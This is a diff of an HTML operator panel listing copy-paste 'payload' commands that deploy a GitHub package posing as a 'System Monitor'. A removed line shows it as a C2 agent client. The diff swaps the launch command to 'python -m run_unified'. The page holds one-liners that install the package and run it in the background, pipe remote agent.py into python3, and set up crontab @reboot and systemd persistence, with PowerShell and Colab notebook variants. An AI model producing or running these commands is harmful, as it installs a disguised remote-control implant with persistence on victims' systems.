@@ -140,7 +140,7 @@
     <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px">
       <div class="quick-ref-card">
         <div class="qr-title">🐍 pip install from GitHub</div>
-        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
+        <div class="payload-code compact"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m run_unified &</div>
         <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Легитимная установка System Monitor</p>
       </div>
       <div class="quick-ref-card">
@@ -151,9 +151,8 @@
       <div class="quick-ref-card">
         <div class="qr-title">📝 Python Cell (Colab)</div>
         <div class="payload-code compact" style="white-space:pre-wrap;font-size:11px"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
-from sysmon import Monitor
-m = Monitor()
-print("Connected")</div>
+import subprocess
+subprocess.Popen(['python', '-m', 'run_unified'])</div>
         <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Для Jupyter/Colab notebook cells</p>
       </div>
     </div>
@@ -172,16 +171,16 @@ print("Connected")</div>
     </p>
 
     <h4 class="section-label">pip install (Linux/macOS):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m run_unified &</div>
 
     <h4 class="section-label">pip install (Windows):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m run_unified</div>
 
     <h4 class="section-label">git clone + run:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && python3 /tmp/sysmon/agent.py &</div>
 
     <h4 class="section-label">With crontab persistence:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot sysmon >/dev/null 2>&1 &") | crontab - && sysmon &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot python -m run_unified >/dev/null 2>&1 &") | crontab - && python -m run_unified &</div>
 
     <h4 class="section-label">With systemd service:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git
@@ -190,7 +189,7 @@ sudo tee /etc/systemd/system/sysmon.service > /dev/null <<EOF
 Description=System Monitor
 After=network.target
 [Service]
-ExecStart=/usr/local/bin/sysmon
+ExecStart=/usr/bin/python3 -m run_unified
 Restart=always
 [Install]
 WantedBy=multi-user.target
@@ -207,7 +206,7 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   </div>
   <div class="body">
     <h4 class="section-label">pip install from GitHub:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon &</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m run_unified &</div>
     
     <h4 class="section-label">curl from GitHub raw:</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL https://raw.githubusercontent.com/GaredBerns/system-monitor/main/agent.py | python3 &</div>
@@ -222,10 +221,10 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   </div>
   <div class="body">
     <h4 class="section-label">pip install from GitHub:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && sysmon</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && python -m run_unified</div>
     
     <h4 class="section-label">PowerShell:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -c "pip install git+https://github.com/GaredBerns/system-monitor.git; sysmon"</div>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -c "pip install git+https://github.com/GaredBerns/system-monitor.git; python -m run_unified"</div>
   </div>
 </div>
 
@@ -238,9 +237,8 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   <div class="body">
     <h4 class="section-label">Notebook Cell:</h4>
     <div class="payload-code" style="white-space:pre-wrap"><button class="copy-btn" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
-from c2_agent import AgentClient
-agent = AgentClient()
-print("Connected")</div>
+import subprocess
+subprocess.Popen(['python', '-m', 'run_unified'])</div>
   </div>
 </div>
 
